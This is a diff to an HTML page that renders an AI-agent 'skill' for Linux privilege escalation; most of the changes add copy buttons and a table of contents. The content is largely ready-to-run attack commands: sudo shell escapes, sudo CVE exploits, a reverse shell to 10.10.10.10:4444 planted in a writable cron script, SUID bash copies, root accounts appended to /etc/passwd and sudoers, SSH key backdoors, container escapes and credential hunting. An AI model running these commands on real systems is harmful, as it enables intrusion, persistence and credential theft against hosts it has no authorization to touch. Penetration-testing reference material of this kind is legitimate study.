@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Escalate privileges on Linux systems using SUID/SGID binaries, capabilities, sudo misconfigurations, cron jobs, kernel exploits, and container escapes. Use when performing Linux post-exploitation or privilege escalation.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>You are a Linux security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:</p>
+<div class="wrap slayout"><article><p>You are a Linux security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:</p>
 <ul>
 <li>Escalating privileges on Linux systems</li>
 <li>Identifying misconfigurations and vulnerabilities</li>
@@ -51,7 +63,7 @@
 <li>Cron job exploitation</li>
 <li>Path hijacking attacks</li>
 </ul>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <p>Activate this skill when the user asks to:</p>
 <ul>
 <li>Escalate privileges on a Linux system</li>
@@ -63,17 +75,30 @@
 <li>Find and exploit cron job weaknesses</li>
 <li>Analyze Linux security misconfigurations</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Windows hosts</strong> — use <a class="xref" href="escalating-windows-privileges.html"><code>escalating-windows-privileges</code></a></li>
 <li><strong>Container escapes</strong> — use <a class="xref" href="exploiting-containers.html"><code>exploiting-containers</code></a></li>
 <li><strong>Keeping the access you gained</strong> — use <a class="xref" href="establishing-persistence.html"><code>establishing-persistence</code></a></li>
 <li><strong>Analyzing a compromised host as a defender</strong> — use <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a></li>
 </ul>
-<h2>Core Methodologies</h2>
+<h2 id="core-methodologies">Core Methodologies</h2>
 <h3>1. Initial System Enumeration</h3>
 <p><strong>System Information:</strong></p>
-<pre><code># OS and kernel version
+<div class="codeblk cx"><button class="copy" data-copy="# OS and kernel version
+cat /proc/version
+uname -a
+lsb_release -a
+cat /etc/os-release
+
+# Check for kernel exploits
+searchsploit &quot;Linux Kernel $(uname -r)&quot;
+uname -r
+
+# CPU and system stats
+lscpu
+cat /proc/cpuinfo
+df -h">copy</button><pre><code># OS and kernel version
 cat /proc/version
 uname -a
 lsb_release -a
@@ -86,9 +111,21 @@ uname -r
 # CPU and system stats
 lscpu
 cat /proc/cpuinfo
-df -h</code></pre>
+df -h</code></pre></div>
 <p><strong>Current User Context:</strong></p>
-<pre><code># Who am I?
+<div class="codeblk cx"><button class="copy" data-copy="# Who am I?
+id
+whoami
+groups
+sudo -l
+
+# Environment variables (passwords, API keys?)
+env
+set
+cat /proc/self/environ | tr &#x27;\0&#x27; &#x27;\n&#x27;
+
+# Check PATH for hijacking opportunities
+echo $PATH">copy</button><pre><code># Who am I?
 id
 whoami
 groups
@@ -100,9 +137,21 @@ set
 cat /proc/self/environ | tr '\0' '\n'
 
 # Check PATH for hijacking opportunities
-echo $PATH</code></pre>
+echo $PATH</code></pre></div>
 <p><strong>Users and Groups:</strong></p>
-<pre><code># All users
+<div class="codeblk cx"><button class="copy" data-copy="# All users
+cat /etc/passwd
+cat /etc/passwd | grep -v &quot;nologin\|false&quot; | cut -d: -f1
+
+# Users with bash
+cat /etc/passwd | grep &quot;/bin/bash&quot;
+
+# User details
+cat /etc/shadow  # If readable
+cat /etc/group
+
+# Home directories
+ls -la /home/">copy</button><pre><code># All users
 cat /etc/passwd
 cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
 
@@ -114,17 +163,35 @@ cat /etc/shadow  # If readable
 cat /etc/group
 
 # Home directories
-ls -la /home/</code></pre>
+ls -la /home/</code></pre></div>
 <h3>2. Sudo Exploitation</h3>
 <p><strong>Check Sudo Permissions:</strong></p>
-<pre><code># What can I run as root?
+<div class="codeblk cx"><button class="copy" data-copy="# What can I run as root?
 sudo -l
 
 # Check sudo version for known vulns
 sudo -V
-sudo --version</code></pre>
+sudo --version">copy</button><pre><code># What can I run as root?
+sudo -l
+
+# Check sudo version for known vulns
+sudo -V
+sudo --version</code></pre></div>
 <p><strong>Common Sudo Misconfigurations:</strong></p>
-<pre><code># NOPASSWD entries
+<div class="codeblk cx"><button class="copy" data-copy="# NOPASSWD entries
+sudo -l | grep NOPASSWD
+
+# Wildcards exploitation
+# If: (root) NOPASSWD: /bin/cp /tmp/* /var/www/html/
+# Then: Create malicious file in /tmp, overwrite system files
+
+# Shell escapes from sudo
+# If you can run vim, less, more, man, etc. with sudo:
+sudo vim -c &#x27;:!/bin/bash&#x27;
+sudo less /etc/profile  # then !/bin/bash
+sudo awk &#x27;BEGIN {system(&quot;/bin/bash&quot;)}&#x27;
+sudo find . -exec /bin/bash \; -quit
+sudo nmap --interactive  # then !bash">copy</button><pre><code># NOPASSWD entries
 sudo -l | grep NOPASSWD
 
 # Wildcards exploitation
@@ -137,9 +204,18 @@ sudo vim -c ':!/bin/bash'
 sudo less /etc/profile  # then !/bin/bash
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo find . -exec /bin/bash \; -quit
-sudo nmap --interactive  # then !bash</code></pre>
+sudo nmap --interactive  # then !bash</code></pre></div>
 <p><strong>Sudo CVEs:</strong></p>
-<pre><code># CVE-2021-3156 (Baron Samedit) - Sudo &lt; 1.9.5p2
+<div class="codeblk cx"><button class="copy" data-copy="# CVE-2021-3156 (Baron Samedit) - Sudo &lt; 1.9.5p2
+sudoedit -s /
+sudoedit -s &#x27;\&#x27; $(python3 -c &#x27;print(&quot;A&quot;*1000)&#x27;)
+
+# CVE-2019-14287 - Sudo &lt; 1.8.28
+# If: (ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash
+
+# CVE-2019-18634 - Sudo &lt; 1.8.26, pwfeedback enabled in /etc/sudoers
+# Exploitable if pwfeedback is enabled in /etc/sudoers">copy</button><pre><code># CVE-2021-3156 (Baron Samedit) - Sudo &lt; 1.9.5p2
 sudoedit -s /
 sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 
@@ -148,18 +224,22 @@ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 sudo -u#-1 /bin/bash
 
 # CVE-2019-18634 - Sudo &lt; 1.8.26, pwfeedback enabled in /etc/sudoers
-# Exploitable if pwfeedback is enabled in /etc/sudoers</code></pre>
+# Exploitable if pwfeedback is enabled in /etc/sudoers</code></pre></div>
 <p><strong>GTFOBins for Sudo:</strong></p>
-<pre><code># Check https://gtfobins.github.io/ for specific binary
+<div class="codeblk cx"><button class="copy" data-copy="# Check https://gtfobins.github.io/ for specific binary
 # Examples:
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 sudo git -p help  # then !/bin/bash
-sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre>
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh">copy</button><pre><code># Check https://gtfobins.github.io/ for specific binary
+# Examples:
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo git -p help  # then !/bin/bash
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre></div>
 <h3>3. SUID/SGID Binaries and Linux Capabilities</h3>
 <p>SUID/SGID binaries and file capabilities are the two most common local privesc vectors. Enumerate every one, then check GTFOBins for each, and prefer <code>-p</code> shells so privileges are not dropped. The exhaustive <code>find</code> enumeration, GTFOBins one-liners, and per-capability abuse catalog live in <code>references/suid-sgid-and-capabilities.md</code>.</p>
 <h3>4. Cron Jobs Exploitation</h3>
 <p><strong>Enumerate Cron Jobs:</strong></p>
-<pre><code># System-wide cron
+<div class="codeblk cx"><button class="copy" data-copy="# System-wide cron
 cat /etc/crontab
 ls -la /etc/cron.*
 ls -la /etc/cron.d/
@@ -172,32 +252,70 @@ crontab -l -u username
 
 # Check for running cron
 ps aux | grep cron
-systemctl status cron</code></pre>
+systemctl status cron">copy</button><pre><code># System-wide cron
+cat /etc/crontab
+ls -la /etc/cron.*
+ls -la /etc/cron.d/
+ls -la /var/spool/cron/
+ls -la /var/spool/cron/crontabs/
+
+# User crontabs
+crontab -l
+crontab -l -u username
+
+# Check for running cron
+ps aux | grep cron
+systemctl status cron</code></pre></div>
 <p><strong>Exploiting Writable Cron Scripts:</strong></p>
-<pre><code># If a cron script is writable
+<div class="codeblk cx"><button class="copy" data-copy="# If a cron script is writable
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27; &gt;&gt; /path/to/cron/script.sh
+# Wait for cron to execute
+/tmp/rootbash -p
+
+# Reverse shell payload
+echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1&#x27; &gt;&gt; /path/to/cron/script.sh">copy</button><pre><code># If a cron script is writable
 echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt;&gt; /path/to/cron/script.sh
 # Wait for cron to execute
 /tmp/rootbash -p
 
 # Reverse shell payload
-echo 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1' &gt;&gt; /path/to/cron/script.sh</code></pre>
+echo 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1' &gt;&gt; /path/to/cron/script.sh</code></pre></div>
 <p><strong>PATH Exploitation in Cron:</strong></p>
-<pre><code># If cron uses relative paths without full path
+<div class="codeblk cx"><button class="copy" data-copy="# If cron uses relative paths without full path
+# Example: /etc/crontab contains: * * * * * root backup.sh
+# Create malicious backup.sh in /tmp/ and modify PATH
+echo &#x27;/bin/bash -c &quot;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&quot;&#x27; &gt; /tmp/backup.sh
+chmod +x /tmp/backup.sh">copy</button><pre><code># If cron uses relative paths without full path
 # Example: /etc/crontab contains: * * * * * root backup.sh
 # Create malicious backup.sh in /tmp/ and modify PATH
 echo '/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' &gt; /tmp/backup.sh
-chmod +x /tmp/backup.sh</code></pre>
+chmod +x /tmp/backup.sh</code></pre></div>
 <p><strong>Wildcards in Cron:</strong></p>
-<pre><code># If cron job has: tar czf /backup/backup.tar.gz *
+<div class="codeblk cx"><button class="copy" data-copy="# If cron job has: tar czf /backup/backup.tar.gz *
+# Create malicious files
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27; &gt; exploit.sh
+chmod +x exploit.sh
+touch -- --checkpoint=1
+touch -- --checkpoint-action=exec=exploit.sh
+# When tar runs with wildcard, it executes exploit.sh">copy</button><pre><code># If cron job has: tar czf /backup/backup.tar.gz *
 # Create malicious files
 echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; exploit.sh
 chmod +x exploit.sh
 touch -- --checkpoint=1
 touch -- --checkpoint-action=exec=exploit.sh
-# When tar runs with wildcard, it executes exploit.sh</code></pre>
+# When tar runs with wildcard, it executes exploit.sh</code></pre></div>
 <h3>5. Writable Files and Directories</h3>
 <p><strong>Find Writable Files:</strong></p>
-<pre><code># World-writable files
+<div class="codeblk cx"><button class="copy" data-copy="# World-writable files
+find / -writable -type f 2&gt;/dev/null | grep -v &quot;/proc/&quot;
+find / -perm -2 -type f 2&gt;/dev/null
+
+# Files owned by current user
+find / -user $(whoami) 2&gt;/dev/null
+find / -group $(groups | cut -d&#x27; &#x27; -f1) 2&gt;/dev/null
+
+# Writable /etc/ files (critical)
+find /etc -writable -type f 2&gt;/dev/null">copy</button><pre><code># World-writable files
 find / -writable -type f 2&gt;/dev/null | grep -v "/proc/"
 find / -perm -2 -type f 2&gt;/dev/null
 
@@ -206,9 +324,25 @@ find / -user $(whoami) 2&gt;/dev/null
 find / -group $(groups | cut -d' ' -f1) 2&gt;/dev/null
 
 # Writable /etc/ files (critical)
-find /etc -writable -type f 2&gt;/dev/null</code></pre>
+find /etc -writable -type f 2&gt;/dev/null</code></pre></div>
 <p><strong>Critical Writable Files:</strong></p>
-<pre><code># /etc/passwd - add root user
+<div class="codeblk cx"><button class="copy" data-copy="# /etc/passwd - add root user
+echo &#x27;newroot::0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd
+su newroot
+
+# /etc/shadow - overwrite root hash
+# Generate hash: openssl passwd -6 password
+# Replace root line
+
+# /etc/sudoers - add sudo permission
+echo &#x27;username ALL=(ALL) NOPASSWD:ALL&#x27; &gt;&gt; /etc/sudoers
+
+# /etc/crontab - add malicious cron
+echo &#x27;* * * * * root /tmp/exploit.sh&#x27; &gt;&gt; /etc/crontab
+
+# ~/.ssh/authorized_keys - add SSH key
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys">copy</button><pre><code># /etc/passwd - add root user
 echo 'newroot::0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
 su newroot
 
@@ -224,10 +358,10 @@ echo '* * * * * root /tmp/exploit.sh' &gt;&gt; /etc/crontab
 
 # ~/.ssh/authorized_keys - add SSH key
 ssh-keygen -t rsa
-cat ~/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</code></pre>
+cat ~/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</code></pre></div>
 <h3>6. Container Escape</h3>
 <p><strong>Detect if in Container:</strong></p>
-<pre><code># Check for .dockerenv
+<div class="codeblk cx"><button class="copy" data-copy="# Check for .dockerenv
 ls -la /.dockerenv
 
 # Check cgroup
@@ -236,9 +370,18 @@ cat /proc/self/cgroup
 
 # Check for container-specific files
 ls -la /.containerenv  # Podman
-cat /proc/1/environ | grep container</code></pre>
+cat /proc/1/environ | grep container">copy</button><pre><code># Check for .dockerenv
+ls -la /.dockerenv
+
+# Check cgroup
+cat /proc/1/cgroup | grep docker
+cat /proc/self/cgroup
+
+# Check for container-specific files
+ls -la /.containerenv  # Podman
+cat /proc/1/environ | grep container</code></pre></div>
 <p><strong>Container Escape Techniques:</strong></p>
-<pre><code># Privileged container with access to /dev
+<div class="codeblk cx"><button class="copy" data-copy="# Privileged container with access to /dev
 # Mount host filesystem
 fdisk -l
 mkdir /mnt/host
@@ -256,10 +399,58 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 # Kubernetes pod escape
 # Service account tokens: /run/secrets/kubernetes.io/serviceaccount/
-kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods</code></pre>
+kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods">copy</button><pre><code># Privileged container with access to /dev
+# Mount host filesystem
+fdisk -l
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host
+
+# Docker socket mounted (/var/run/docker.sock)
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Cap_sys_admin capability
+# Can mount host filesystem or abuse other admin functions
+
+# containerd/runc escape (CVE-2019-5736)
+# Overwrite runc binary on host
+
+# Kubernetes pod escape
+# Service account tokens: /run/secrets/kubernetes.io/serviceaccount/
+kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods</code></pre></div>
 <h3>7. Password Hunting</h3>
 <p><strong>Search for Passwords:</strong></p>
-<pre><code># Grep for password strings
+<div class="codeblk cx"><button class="copy" data-copy="# Grep for password strings
+grep -r &quot;password&quot; /home/ 2&gt;/dev/null
+grep -r &quot;passwd&quot; /var/www/ 2&gt;/dev/null
+grep -ir &quot;pwd\|pass&quot; /opt/ 2&gt;/dev/null
+
+# Configuration files
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.ssh/id_rsa
+
+# Database files
+find / -name &quot;*.db&quot; 2&gt;/dev/null
+find / -name &quot;*.sqlite&quot; 2&gt;/dev/null
+
+# Check environment
+env | grep -i pass
+
+# Check for credentials in scripts
+find / -name &quot;*.sh&quot; -exec grep -l &quot;password&quot; {} \; 2&gt;/dev/null
+find / -name &quot;*.py&quot; -exec grep -l &quot;password&quot; {} \; 2&gt;/dev/null
+
+# Memory dumps
+strings /dev/mem
+strings /proc/kcore
+
+# SSH keys
+find / -name id_rsa 2&gt;/dev/null
+find / -name id_dsa 2&gt;/dev/null
+find / -name authorized_keys 2&gt;/dev/null">copy</button><pre><code># Grep for password strings
 grep -r "password" /home/ 2&gt;/dev/null
 grep -r "passwd" /var/www/ 2&gt;/dev/null
 grep -ir "pwd\|pass" /opt/ 2&gt;/dev/null
@@ -289,33 +480,47 @@ strings /proc/kcore
 # SSH keys
 find / -name id_rsa 2&gt;/dev/null
 find / -name id_dsa 2&gt;/dev/null
-find / -name authorized_keys 2&gt;/dev/null</code></pre>
+find / -name authorized_keys 2&gt;/dev/null</code></pre></div>
 <h3>8. Kernel Exploits and NFS</h3>
 <p>Last-resort paths, kept out of line because they are rarely the right answer and are unstable when they are. See <code>references/kernel-and-nfs.md</code> for kernel exploit selection and <code>no_root_squash</code> NFS abuse.</p>
-<h2>Automated Enumeration Tools</h2>
+<h2 id="automated-enumeration-tools">Automated Enumeration Tools</h2>
 <p><strong>LinPEAS (Recommended):</strong></p>
-<pre><code># Download and run
+<div class="codeblk cx"><button class="copy" data-copy="# Download and run
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Or locally
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
-./linpeas.sh</code></pre>
+./linpeas.sh">copy</button><pre><code># Download and run
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Or locally
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre></div>
 <p><strong>LinEnum:</strong></p>
-<pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+<div class="codeblk cx"><button class="copy" data-copy="wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 chmod +x LinEnum.sh
-./LinEnum.sh</code></pre>
+./LinEnum.sh">copy</button><pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh</code></pre></div>
 <p><strong>Linux Smart Enumeration (LSE):</strong></p>
-<pre><code>wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+<div class="codeblk cx"><button class="copy" data-copy="wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
 chmod +x lse.sh
 ./lse.sh -l1  # Level 1 (fast)
-./lse.sh -l2  # Level 2 (thorough)</code></pre>
+./lse.sh -l2  # Level 2 (thorough)">copy</button><pre><code>wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+chmod +x lse.sh
+./lse.sh -l1  # Level 1 (fast)
+./lse.sh -l2  # Level 2 (thorough)</code></pre></div>
 <p><strong>pspy (Monitor Processes):</strong></p>
-<pre><code># Monitor for cron jobs and processes without root
+<div class="codeblk cx"><button class="copy" data-copy="# Monitor for cron jobs and processes without root
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
 chmod +x pspy64
-./pspy64</code></pre>
-<h2>Troubleshooting</h2>
+./pspy64">copy</button><pre><code># Monitor for cron jobs and processes without root
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64</code></pre></div>
+<h2 id="troubleshooting">Troubleshooting</h2>
 <p><strong>Exploit Not Working:</strong></p>
 <ul>
 <li>Check architecture: <code>uname -m</code> (x86_64, i686, arm, etc.)</li>
@@ -344,7 +549,7 @@ chmod +x pspy64
 <li>Check AppArmor/SELinux is not blocking</li>
 <li>Try different attack vector</li>
 </ul>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a href="references/suid-sgid-and-capabilities.md">references/suid-sgid-and-capabilities.md</a> — SUID/SGID and capabilities enumeration/exploitation catalog (progressive disclosure)</li>
 <li><a href="references/kernel-and-nfs.md">references/kernel-and-nfs.md</a> — Kernel exploit selection and <code>no_root_squash</code> NFS abuse (progressive disclosure)</li>
@@ -354,7 +559,7 @@ chmod +x pspy64
 <li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</li>
 <li>Linux Privilege Escalation Techniques: https://book.hacktricks.xyz/linux-hardening/privilege-escalation</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Execution</strong> (TA0002)</p>
 <ul>
@@ -386,5 +591,8 @@ chmod +x pspy64
 <ul>
 <li><a href="https://attack.mitre.org/techniques/T1021/004/">T1021.004</a> SSH — see also <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a></li>
 </ul>
-<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#core-methodologies">Core Methodologies</a><a href="#automated-enumeration-tools">Automated Enumeration Tools</a><a href="#troubleshooting">Troubleshooting</a><a href="#references">References</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
